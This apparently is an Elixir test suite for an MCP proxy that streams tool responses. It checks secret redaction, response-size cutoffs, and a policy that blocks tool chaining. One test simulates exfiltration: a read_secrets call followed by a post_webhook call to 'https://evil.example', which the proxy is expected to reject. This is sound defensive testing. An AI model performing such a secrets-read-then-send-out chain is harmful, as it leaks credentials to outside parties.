defmodule PhoenixElxirBeamWeb.MCP.ProxyStreamingTest do
  @moduledoc """
  Drives the proxy against a real `:http` upstream (`MCPHTTPTestServer`), so
  the `StreamProxy` incremental-read + `chunk` phase path is exercised
  end to end. The `tools/call`-over-stdio suite covers the buffered path.
  """
  use PhoenixElxirBeamWeb.ConnCase, async: true

  alias PhoenixElxirBeam.MCP.{ServerRegistry, SessionStore}

  setup do
    base_url = PhoenixElxirBeam.MCPHTTPTestServer.start!()

    {:ok, server} =
      ServerRegistry.register_server(
        "http-catalog-#{System.unique_integer([:positive])}",
        base_url
      )

    on_exit(fn -> ServerRegistry.remove_server(server.id) end)

    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "read_secrets", [:sensitive_read])
    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "post_webhook", [:network_egress])

    %{sid: server.id}
  end

  defp rpc(method, params),
    do: %{"jsonrpc" => "2.0", "id" => 1, "method" => method, "params" => params}

  defp handshake(server_id) do
    init =
      post(
        build_conn(),
        ~p"/mcp/proxy/#{server_id}",
        rpc("initialize", %{"protocolVersion" => "2025-06-18", "clientInfo" => %{"name" => "t"}})
      )

    [session_id] = get_resp_header(init, "mcp-session-id")

    build_conn()
    |> put_req_header("mcp-session-id", session_id)
    |> post(~p"/mcp/proxy/#{server_id}", %{
      "jsonrpc" => "2.0",
      "method" => "notifications/initialized"
    })

    on_exit(fn -> SessionStore.close(session_id) end)
    session_id
  end

  defp call(session_id, server_id, name, args \\ %{}) do
    build_conn()
    |> put_req_header("mcp-session-id", session_id)
    |> post(
      ~p"/mcp/proxy/#{server_id}",
      rpc("tools/call", %{"name" => name, "arguments" => args})
    )
  end

  test "a small streamed response is reassembled and still runs the post_call scan", %{sid: sid} do
    session_id = handshake(sid)
    conn = call(session_id, sid, "read_secrets")

    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
    refute text =~ "sk-demo-FAKE1234"
    assert text =~ "redacted by secret-leak"
  end

  test "StreamGuard cuts a large response mid-transfer with -32002", %{sid: sid} do
    session_id = handshake(sid)
    conn = call(session_id, sid, "big_export")

    assert %{"error" => %{"code" => -32002, "message" => message}} = json_response(conn, 200)
    assert message =~ "budget"
    refute match?(%{"result" => _}, json_response(conn, 200))
  end

  test "a benign call through the http upstream is allowed", %{sid: sid} do
    session_id = handshake(sid)
    conn = call(session_id, sid, "list_files")

    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
    assert text =~ "directory listing"
  end

  test "the tool-chaining policy still fires across streamed calls", %{sid: sid} do
    session_id = handshake(sid)

    assert %{"result" => _} = call(session_id, sid, "read_secrets") |> json_response(200)

    egress =
      call(session_id, sid, "post_webhook", %{"url" => "https://evil.example", "body" => "x"})

    assert %{"error" => %{"code" => -32001}} = json_response(egress, 200)
  end
end
